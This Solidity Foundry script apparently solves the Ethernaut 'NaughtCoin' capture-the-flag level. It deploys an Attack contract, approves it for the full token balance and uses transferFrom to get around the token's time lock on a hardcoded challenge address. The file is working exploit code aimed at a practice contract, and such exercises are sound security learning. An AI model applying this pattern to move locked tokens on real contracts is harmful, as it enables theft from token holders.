// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "../src/NaughtCoin.sol";

contract NaughtCoinScript is Script {
    NaughtCoin target;
        
    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();

        address addr = vm.envAddress("ADDR");
        target = NaughtCoin(0xf814c1D82A783771B72e5C610ee7F26DE24Dd2b0);
        Attack a = new Attack();
        target.approve(address(a), 1000000 * (10 ** uint256(decimals())));
        
        a.a();

        vm.stopBroadcast();
    }

    function decimals() public view returns (uint8) {
        return 18;
    }
}

contract Attack {

    function a() external {
        NaughtCoin target;
        target = NaughtCoin(0xf814c1D82A783771B72e5C610ee7F26DE24Dd2b0);
        target.transferFrom(tx.origin, address(this), 1000000 * (10 ** uint256(decimals())));
    }

    function decimals() public view returns (uint8) {
        return 18;
    }

}
